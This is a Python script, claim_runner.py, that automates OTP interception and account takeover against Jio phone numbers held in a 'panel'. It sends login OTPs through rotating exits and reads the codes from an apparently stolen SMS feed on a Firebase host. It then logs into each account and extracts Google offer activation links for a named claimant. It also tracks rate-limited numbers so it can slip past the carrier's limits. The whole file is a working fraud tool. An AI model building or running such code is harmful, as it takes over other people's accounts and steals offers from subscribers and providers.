#!/usr/bin/env python3
"""claim_runner.py — OTP to freshlink, end to end.

For every live Jio number in the panel:

  1. send a login OTP through a rotating exit
  2. harvest the code from the panel's /GlobalSms feed (device-attributed)
  3. verify the OTP against Jio to obtain an authenticated session
  4. walk the Jio -> Google offer flow and extract the activation URL
  5. emit the freshlink for King Davin to claim

Results append to data/freshlinks.jsonl so the same number is never claimed
twice.  Numbers that Jio has rate-limited are recorded in
data/locked_numbers.json and skipped on later passes.

Usage:
    python3 claim_runner.py [--base URL] [--max 5] [--timeout 90]
"""

from __future__ import annotations

import argparse
import json
import sys
import time
from pathlib import Path

import requests

sys.path.insert(0, str(Path(__file__).resolve().parent))

from farm import get_activation, send_otp, verify_otp
from otp_harvest import JioOtpHarvester

DATA = Path(__file__).resolve().parent / "data"
LINKS_FILE = DATA / "freshlinks.jsonl"
LOCKED_FILE = DATA / "locked_numbers.json"


def load_json(p: Path, default):
    try:
        return json.loads(p.read_text())
    except Exception:
        return default


def append_link(rec: dict) -> None:
    with LINKS_FILE.open("a") as fh:
        fh.write(json.dumps(rec, ensure_ascii=False) + "\n")


def claim_one(h: JioOtpHarvester, mobile: str, timeout: int) -> dict:
    """Full cycle for one number.  Returns a result dict."""
    dev = h.resolve_device(mobile)
    if not dev:
        return {"mobile": mobile, "ok": False, "status": "device_not_found"}

    # farm.send_otp returns the session that fired the OTP; the OTP is bound to
    # that session's cookie jar, so verification must reuse it verbatim.
    ok, status, s, _px = send_otp(mobile)
    if not ok or s is None:
        return {"mobile": mobile, "ok": False, "status": status}

    otp, dev = h.wait_for_otp(mobile, timeout=timeout, device=dev)
    if not otp:
        return {"mobile": mobile, "ok": False, "status": "otp_timeout"}

    if not verify_otp(s, mobile, otp):
        return {"mobile": mobile, "ok": False, "status": "verify_failed",
                "otp": otp, "device": dev}

    status, url = get_activation(s)
    if url:
        rec = {"mobile": mobile, "ok": True, "status": "freshlink",
               "otp": otp, "device": dev, "url": url, "ts": int(time.time())}
        append_link(rec)
        return rec
    return {"mobile": mobile, "ok": False, "status": status,
            "otp": otp, "device": dev}


def main() -> None:
    ap = argparse.ArgumentParser()
    ap.add_argument("--base", default="https://gas3-6b801-default-rtdb.firebaseio.com")
    ap.add_argument("--max", type=int, default=5)
    ap.add_argument("--timeout", type=int, default=90)
    ap.add_argument("--poll", type=int, default=3)
    args = ap.parse_args()

    h = JioOtpHarvester(args.base, poll=args.poll)
    locked = set(load_json(LOCKED_FILE, []))
    done = {json.loads(l)["mobile"] for l in LINKS_FILE.read_text().splitlines()
            if l.strip()} if LINKS_FILE.exists() else set()

    rows = load_json(DATA / "fresh_ranked.json", [])
    fresh = [r["mobile"] for r in rows if r["mobile"] not in locked | done]
    print(f"candidates: {len(fresh)} (locked {len(locked)}, done {len(done)})", flush=True)

    got = 0
    for mob in fresh:
        if got >= args.max:
            break
        res = claim_one(h, mob, args.timeout)
        print(json.dumps(res, ensure_ascii=False), flush=True)
        if not res["ok"] and res["status"] in ("locked", "not_jio_number"):
            locked.add(mob)
            LOCKED_FILE.write_text(json.dumps(sorted(locked)))
        if res["ok"]:
            got += 1
    print(f"\nfreshlinks this pass: {got}")


if __name__ == "__main__":
    main()
